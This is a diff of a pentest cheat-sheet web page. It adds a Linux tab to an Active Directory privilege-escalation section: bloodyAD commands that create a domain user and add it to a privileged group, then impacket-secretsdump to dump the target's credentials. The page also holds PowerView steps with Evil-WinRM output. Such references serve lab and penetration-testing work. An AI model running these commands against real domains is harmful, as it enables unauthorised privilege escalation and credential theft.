@@ -149,6 +149,7 @@
   <li><a href="https://tldrbins.github.io/@evil-winrm/">Evil-Winrm</a></li>
   <li><a href="https://tldrbins.github.io/@powerview/">Powerview</a></li>
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  <li><a href="https://tldrbins.github.io/@create-user/">Create User</a></li>
 </ul>
 <hr>
 <div class="content">
@@ -162,7 +163,7 @@
   </ul>
 </div>
   <div id="dynamicFormContainer">
-	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="NEW_USER_PASSWORD">NEW USER PASSWORD: </label><input type="text" name="NEW_USER_PASSWORD"></div><div class="input-group"><label for="NEW_USER">NEW USER: </label><input type="text" name="NEW_USER"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="TARGET">TARGET: </label><input type="text" name="TARGET"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="GROUP">GROUP: </label><input type="text" name="GROUP"></div><div class="input-group"><label for="NEW_PASSWORD">NEW PASSWORD: </label><input type="text" name="NEW_PASSWORD"></div><div class="input-group"><label for="NEW_USER_PASSWORD">NEW USER PASSWORD: </label><input type="text" name="NEW_USER_PASSWORD"></div><div class="input-group"><label for="NEW_USER">NEW USER: </label><input type="text" name="NEW_USER"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="TARGET">TARGET: </label><input type="text" name="TARGET"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
 	<div class="buttons center">
 		<button id="form_btn">Show Inspector</button>
 		<button id="replace_btn" style="display: none;">Replace Params</button>
@@ -170,11 +171,22 @@
 		<button id="clear_btn" style="display: none;">Clear Cache</button>
 	</div>
 </div>
-  <h3 id="privesc-1-create-a-new-user-account-and-add-it-to-laps-local-administrator-password-solution-group">Privesc #1: Create a New User Account and Add it to LAPS (Local Administrator Password Solution) Group</h3>
+  <h3 id="privesc-1-create-a-new-user-account-and-add-it-to-privilege-group">Privesc #1: Create a New User Account and Add it to Privilege Group</h3>
 <p class="tabs">
-<button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
 
-</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
+<button data-tabset="set1" data-tabcontent="tab2">Windows</button>
+
+</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-create-a-new-user-account">1. Create a New User Account</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">bloodyAD -d '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' --host '<span class="o editable-keyword">&lt;TARGET&gt;</span>' add user '<span class="o editable-keyword">&lt;NEW_USER&gt;</span>' '<span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="2-add-the-new-user-to-privilege-group">2. Add the New User to Privilege Group</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">bloodyAD -d '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' --host '<span class="o editable-keyword">&lt;TARGET&gt;</span>' add groupMember '<span class="o editable-keyword">&lt;GROUP&gt;</span>' '<span class="o editable-keyword">&lt;NEW_USER&gt;</span>' 
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="3-secrets-dump">3. Secrets Dump</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump '<span class="o editable-keyword">&lt;NEW_USER&gt;</span>:<span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span>@<span class="o editable-keyword">&lt;TARGET&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; . .\PowerView.ps1
@@ -229,7 +241,9 @@ TO-DO</div></pre></div><h4 id="3-create-a-new-user-password-object">3. Create a 
 </span></span></span><span class="line"><span class="cl"><span class="go">SamAccountName    : PIVOTAPI$
 </span></span></span><span class="line"><span class="cl"><span class="go">SID               : S-1-5-21-842165252-2479896602-2762773115-1004
 </span></span></span><span class="line"><span class="cl"><span class="go">UserPrincipalName :
-</span></span></span></div></pre></div></div></div><p></p>
+</span></span></span></div></pre></div></div></div>
+
+<p></p>
 
 </div>
 </main>
